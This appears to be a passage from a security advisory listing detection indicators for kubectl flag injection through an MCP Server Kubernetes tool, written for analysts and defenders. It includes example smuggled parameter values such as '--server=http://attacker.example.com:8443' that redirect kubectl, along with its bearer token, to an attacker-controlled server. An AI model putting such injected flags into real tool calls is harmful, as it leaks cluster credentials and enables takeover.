## Network Indicators

*No specific attacker-controlled IP addresses or infrastructure have been identified from the available context. No CISA KEV entry is present, and no public PoC exploit infrastructure has been observed.*

**Observable Network Behaviour Patterns (LOW–MEDIUM confidence):**
- Outbound kubectl API calls from MCP Server Kubernetes pods/containers to unexpected external IP addresses or hostnames — consistent with `--server` flag injection redirecting kubectl to an attacker-controlled API server [2][3]
- Unexpected TLS connections from cluster nodes or MCP server processes to non-cluster API server endpoints (i.e., destinations other than the legitimate kube-apiserver address)
- Bearer token transmission to external hosts: monitor for HTTP/HTTPS `Authorization: Bearer <token>` headers sent to non-internal API server addresses [3]

## Parameter / Argument Indicators

**Confidence: MEDIUM** — derived from vulnerability mechanism [2][3]

The following patterns in MCP tool invocation input represent the core exploitation mechanism. Analyst should look for these in MCP request logs, audit logs, or API gateway logs:

- `resourceType` parameter values beginning with a leading dash (`-`) or containing `--server` substrings
  
  resourceType: "--server=<external_host>"
  
- `name` parameter values beginning with a leading dash (`-`) or containing kubectl flag injection patterns
  
  name: "--server=http://attacker.example.com:8443"
  
- Any MCP structured tool call where `resourceType` or `name` values contain flag-like strings (e.g., `--`, `-s`, `--kubeconfig`, `--token`) — bypassing the `assertNoDangerousFlags` check [2][3]
